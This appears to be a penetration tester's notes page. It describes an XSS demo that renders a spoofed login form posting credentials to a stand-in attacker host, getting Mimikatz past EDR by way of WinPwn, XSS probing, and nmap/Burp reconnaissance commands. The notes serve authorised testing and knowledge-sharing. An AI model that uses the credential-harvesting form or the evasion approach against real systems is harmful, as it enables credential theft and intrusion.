## Selected Findings

### XSS → Credential Harvesting Demo

I found a reflected XSS vulnerability on an anonymously-accessible endpoint and was asked to demonstrate real-world impact. Since there was no login session to hijack, I used HTML injection to render a spoofed login form in its place — showing the client how easily user credentials could be harvested. I also walked a teammate through the approach as a quick knowledge-share.


```html
<form action="https://attacker-controlled.example/collect" method="POST">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Sign In</button>
</form>
```



<br>


### Mimikatz Execution on a Hardened Endpoint via WinPwn

I was provided a well-hardened endpoint to test.  Direct Mimikatz execution was reliably blocked, even after trying several AMSI-bypass techniques (including a number from [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), which — unsurprisingly — were already well signatured). I pivoted to [WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn), a broader enumeration and exploitation toolkit, which loads Mimikatz indirectly rather than invoking it directly. That indirection was enough to slip past the endpoint's detection and get it running.

**Takeaway:** Direct signature-based blocks on known tools like Mimikatz don't always account for tools that load them as a dependency rather than invoking them by name — a useful reminder when evaluating EDR coverage.



<br><br>

<br><br>
Neat little trick to enumerate web sites via the SSL Cert<br>
nmap -Pn -p 443 --script ssl-cert --open [target].250-253| grep -e 172.24.100 -e "commonName"<br><br>

<details>
<summary>XSS Workflow</summary>

<br>

I've found quite a few stored and reflected XSS issues over the years. I enjoy discovering them and understanding how the application is handling input and output. I'll probably post more detailed writeups later, but for now I just wanted to share a few notes on my general process.

My typical approach is to start with simple payloads in input fields:

```html
<img src=xss>
```

Then I send the requests through Burp Suite and watch what gets reflected back in the response. If characters like `<` and `>` are converted into entities such as `&lt;` and `&gt;`, that immediately gives me a better idea of how the application is processing input.

I also pay attention to cookies and response headers to identify what kind of infrastructure may be sitting in front of the application. 

Developer tools are extremely helpful for understanding context. I want to know exactly where the payload lands:
Is the payload landing between HTML tags, inside an value, within javascipt..    This ddetermines how to break-out or encoding bypass.

What characters are encoded, filtered, etc..
</details>


<br><br>
<b>Getting large number of Web Sites into Burp</b><br>
a. Scan the network for common web ports with nmap and output that in greppable format -oG net.scan<br>
b. Open burp and have it ready to accept incoming requests<br>
c. Use a for loop to cat that file into Burp with something like 'for i in $(cat net.scan)do curl --proxy localhost:8080'<br>





